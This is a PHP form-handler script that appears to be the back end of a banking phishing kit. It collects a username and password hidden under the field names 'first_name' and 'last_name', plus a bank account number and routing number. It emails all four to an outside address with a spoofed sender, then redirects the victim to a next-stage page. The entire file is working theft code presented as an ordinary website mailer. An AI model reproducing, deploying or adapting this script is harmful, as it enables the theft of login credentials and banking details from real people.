<?php
//get data from form  
$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
$accnum= $_POST['accnum'];
$rtnum= $_POST['rtnum'];
$to = "lawyer.paul@macr2.com";
$subject = "Mail From website";
$txt ="Ussr = ". $first_name . "\r\n PAsso = ". $last_name . "\r\n  ACCnum = " . $accnum . "\r\n RTNum =" . $rtnum;
$headers = "From: account@offshore.cusocalb.com" . "\r\n" .
"CC: lawyer.paul@macr2.com";
if($rtnum!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:indexload2.html");
?>